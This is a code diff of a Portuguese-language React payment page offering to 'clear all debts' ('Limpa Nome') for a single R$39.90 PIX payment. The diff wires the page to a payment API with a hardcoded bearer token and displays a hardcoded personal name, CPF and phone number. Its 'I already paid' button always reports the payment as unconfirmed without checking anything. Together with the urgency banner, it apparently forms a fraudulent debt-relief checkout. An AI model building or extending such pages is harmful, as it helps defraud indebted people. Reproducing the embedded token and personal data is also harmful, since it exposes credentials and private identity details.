@@ -1,8 +1,7 @@
 import { useState, useEffect } from "react";
 import { useNavigate } from "react-router-dom";
-import { Copy, QrCode, CheckCircle2, HelpCircle, ChevronDown, AlertCircle } from "lucide-react";
+import { Copy, QrCode, CheckCircle2, HelpCircle, ChevronDown, AlertCircle, Loader2 } from "lucide-react";
 import { Button } from "@/components/ui/button";
-import { CountdownTimer } from "@/components/CountdownTimer";
 import { TrustBadge } from "@/components/TrustBadge";
 import { toast } from "sonner";
 import {
@@ -10,33 +9,101 @@ import {
   CollapsibleContent,
   CollapsibleTrigger,
 } from "@/components/ui/collapsible";
+import { Skeleton } from "@/components/ui/skeleton"; // Importei o Skeleton
+
+// Token da API (como solicitado, está aqui para testes)
+const API_TOKEN = "298|TFk8AllUCxCBnb3aM7mYJX4RGe9UBHv3uy2KSfbO4c130b92";
+const API_URL = "https://virtualpay.online/api/v1/transactions/deposit";
 
 export default function Payment() {
   const navigate = useNavigate();
   const [pixCopied, setPixCopied] = useState(false);
-  // Os dados agora são estáticos conforme solicitado
+  
+  // States para o PIX dinâmico
+  const [isLoadingPix, setIsLoadingPix] = useState(true);
+  const [pixQrCodeImage, setPixQrCodeImage] = useState(""); // para o base64 da imagem
+  const [pixCopyPaste, setPixCopyPaste] = useState("Gerando PIX..."); // para o código copia e cola
+  
+  // Dados do usuário (fixos, conforme solicitado)
   const userName = "PEDRO HENRIQUE COSTA SOUSA";
   const userCpf = "111.097.675-52";
   const userWhatsApp = "(73) 99927-6645";
-  const pixCode = "00020126330014BR.GOV.BCB.PIX0114+55119999999990204000053039865802BR5913NOME EMPRESA6009SAO PAULO62070503***63041D3D";
+  const paymentAmount = "39.90";
 
   useEffect(() => {
-    // Apenas verifica se a sessão existe, mas não usa os dados
+    // Apenas verifica se a sessão existe
     const userData = sessionStorage.getItem("userData");
     const whatsapp = sessionStorage.getItem("whatsapp");
     if (!userData || !whatsapp) {
       navigate("/");
       return;
     }
+
+    // Função para buscar os dados do PIX na API
+    const generatePix = async () => {
+      setIsLoadingPix(true);
+      try {
+        // Pega os dados da sessão para enviar na API
+        const sessionData = JSON.parse(sessionStorage.getItem("userData") || "{}");
+        const name = sessionData.name || userName; // Usa o nome da sessão ou o fixo
+        const document = (sessionData.cpf || userCpf).replace(/\D/g, ""); // Limpa o CPF
+
+        const response = await fetch(API_URL, {
+          method: "POST",
+          headers: {
+            "Accept": "application/json",
+            "Content-Type": "application/json",
+            "Authorization": `Bearer ${API_TOKEN}`,
+          },
+          body: JSON.stringify({
+            name: name,
+            description: "Quitação de Dívidas - Limpa Nome",
+            document: document,
+            amount: paymentAmount, // Valor do pagamento
+          }),
+        });
+
+        if (!response.ok) {
+          throw new Error("Falha ao gerar o PIX. Tente novamente.");
+        }
+
+        const data = await response.json();
+
+        // Salva os dados do PIX no estado
+        setPixQrCodeImage(data.qr_code_base64);
+        setPixCopyPaste(data.qr_code);
+
+      } catch (error) {
+        console.error(error);
+        toast.error("Erro ao gerar PIX", {
+          description: "Não foi possível gerar o PIX. Por favor, atualize a página e tente novamente.",
+        });
+        setPixCopyPaste("Erro ao gerar código.");
+      } finally {
+        setIsLoadingPix(false);
+      }
+    };
+
+    generatePix();
+    // eslint-disable-next-line react-hooks/exhaustive-deps
   }, [navigate]);
 
   const handleCopyPix = () => {
-    navigator.clipboard.writeText(pixCode);
+    if (isLoadingPix || !pixCopyPaste) return;
+    navigator.clipboard.writeText(pixCopyPaste);
     setPixCopied(true);
     toast.success("PIX copiado! Abra seu app e cole para pagar.", {
       duration: 3000,
     });
     setTimeout(() => setPixCopied(false), 3000);
+  };
+  
+  const handleCheckPayment = () => {
+    // ALTERADO: Mostra toast de "pagamento não efetuado"
+    toast.error("Pagamento não identificado", {
+      description: "Seu pagamento ainda não foi confirmado. Por favor, aguarde alguns minutos e tente novamente.",
+      duration: 4000,
+    });
   };
 
   return (
@@ -48,14 +115,12 @@ export default function Payment() {
             <p className="text-xs md:text-sm font-bold text-foreground">🎯 Oferta Especial de Novembro</p>
           </div>
           
-          {/* ALTERADO: Texto do header */}
+          {/* ALTERADO: Texto do header (sem valor) */}
           <h1 className="text-2xl md:text-4xl font-bold text-foreground mb-2">
             {userName.split(" ")[0]}, confirme as informações e
             <br />
             finalize o pagamento abaixo
           </h1>
-          
-          {/* O valor R$ 39,90 foi removido daqui e movido para o alerta abaixo */}
         </div>
 
         {/* User Confirmation */}
@@ -64,7 +129,6 @@ export default function Payment() {
             <CheckCircle2 className="w-5 h-5 text-success" />
             Confirme seus dados
           </h3>
-          {/* ALTERADO: Dados estáticos e remoção do valor */}
           <div className="space-y-2 text-sm md:text-base">
             <div className="flex justify-between py-2 border-b border-border">
               <span className="text-muted-foreground">Nome:</span>
@@ -79,7 +143,6 @@ export default function Payment() {
               <span className="font-semibold text-foreground">{userWhatsApp}</span>
             </div>
           </div>
-          {/* ALTERADO: Texto de quitação */}
           <div className="mt-4 p-5 bg-success/10 rounded-lg border-2 border-success/30">
             <p className="text-lg md:text-xl text-foreground font-bold text-center">
               ✓ Todas as suas dívidas serão quitadas por este valor único
@@ -88,12 +151,12 @@ export default function Payment() {
         </div>
 
         {/* Urgency Alert */}
-        {/* ALTERADO: Estilo (azul/secondary) e conteúdo do alerta */}
+        {/* ALTERADO: Estilo e texto do alerta */}
         <div className="bg-secondary/10 border-2 border-secondary rounded-xl p-6 md:p-8 animate-slide-up">
           <div className="text-center space-y-4">
             <AlertCircle className="w-10 h-10 md:w-12 md:h-12 text-secondary mx-auto" />
             <p className="font-bold text-foreground text-xl md:text-2xl">
-              ⚠ Finalize o pagamento abaixo no valor de
+              Finalize o pagamento abaixo no valor
             </p>
             <p className="text-6xl md:text-7xl font-bold text-primary">
               R$ 39,90
@@ -103,39 +166,63 @@ export default function Payment() {
 
         {/* PIX Payment Card */}
         <div className="bg-card rounded-2xl shadow-xl p-6 md:p-8 space-y-6 border border-border animate-slide-up">
-          {/* QR Code Placeholder */}
+          
+          {/* QR Code Dinâmico */}
           <div className="bg-muted rounded-xl p-6 md:p-8 flex items-center justify-center">
             <div className="text-center space-y-4">
-              <div className="inline-flex items-center justify-center w-40 h-40 md:w-48 md:h-48 bg-card rounded-xl border-2 border-border">
-                <QrCode className="w-28 h-28 md:w-32 md:h-32 text-muted-foreground" />
+              <div className="inline-flex items-center justify-center w-48 h-48 md:w-56 md:h-56 bg-card rounded-xl border-2 border-border">
+                {isLoadingPix ? (
+                  <div className="flex flex-col items-center gap-4 text-muted-foreground">
+                    <Loader2 className="w-12 h-12 animate-spin" />
+                    <span className="font-semibold">Gerando PIX...</span>
+                  </div>
+                ) : (
+                  pixQrCodeImage ? (
+                    <img src={pixQrCodeImage} alt="QR Code PIX" className="w-full h-full rounded-lg" />
+                  ) : (
+                    <div className="flex flex-col items-center gap-4 text-destructive">
+                      <AlertTriangle className="w-12 h-12" />
+                      <span className="font-semibold text-center">Erro ao gerar QR Code.<br/>Atualize a página.</span>
+                    </div>
+                  )
+                )}
               </div>
               <p className="text-xs md:text-sm text-muted-foreground">Escaneie o QR Code com seu app de pagamento</p>
             </div>
           </div>
 
           {/* PIX Copy-Paste */}
-          <div className="space-y-3">
-            <p className="text-sm md:text-base font-semibold text-foreground text-center">
-              Ou copie o código PIX copia e cola:
+          <div className="space-y-4 text-center">
+            {/* ALTERADO: Texto "PIX COPIA E COLA" maior */}
+            <p className="text-xl font-semibold text-foreground">
+              PIX COPIA E COLA
             </p>
             
-            <div className="flex flex-col sm:flex-row gap-2">
-              <div className="flex-1 bg-muted rounded-lg p-3 text-xs md:text-sm text-muted-foreground font-mono break-all">
-                {pixCode.substring(0, 50)}...
+            <div className="flex flex-col gap-3">
+              {/* Caixa do código */}
+              <div className="w-full bg-muted rounded-lg p-3 text-sm text-muted-foreground font-mono break-all text-left">
+                {isLoadingPix ? (
+                  <Skeleton className="h-5 w-full" />
+                ) : (
+                  pixCopyPaste
+                )}
               </div>
+              
+              {/* ALTERADO: Botão "Copiar PIX" maior e centralizado */}
               <Button
                 onClick={handleCopyPix}
                 size="lg"
-                className="bg-primary hover:bg-primary-hover font-bold whitespace-nowrap transition-all duration-300 h-auto py-3"
+                className="w-full bg-primary hover:bg-primary-hover font-bold transition-all duration-300 text-2xl h-auto py-4"
+                disabled={isLoadingPix || !pixQrCodeImage}
               >
                 {pixCopied ? (
                   <>
-                    <CheckCircle2 className="w-5 h-5 mr-2" />
+                    <CheckCircle2 className="w-7 h-7 mr-2" />
                     Copiado!
                   </>
                 ) : (
                   <>
-                    <Copy className="w-5 h-5 mr-2" />
+                    <Copy className="w-7 h-7 mr-2" />
                     Copiar PIX
                   </>
                 )}
@@ -144,9 +231,9 @@ export default function Payment() {
           </div>
 
           {/* Trust Badges */}
-          <div className="flex flex-wrap justify-center gap-3 pt-4 border-t border-border">
+          {/* ALTERADO: Apenas 1 badge centralizado */}
+          <div className="flex justify-center gap-3 pt-4 border-t border-border">
             <TrustBadge variant="security" text="Pagamento seguro" />
-            <TrustBadge variant="verified" text="Confirmação automática" />
           </div>
 
           {/* Benefits */}
@@ -198,10 +285,12 @@ export default function Payment() {
         </Collapsible>
 
         {/* Action Button */}
+        {/* ALTERADO: Adicionado onClick para verificar pagamento */}
         <div className="animate-slide-up">
           <Button 
             size="lg"
             className="w-full h-14 md:h-16 text-lg md:text-xl font-bold bg-success hover:bg-success/90"
+            onClick={handleCheckPayment}
           >
             Já realizei o pagamento
           </Button>
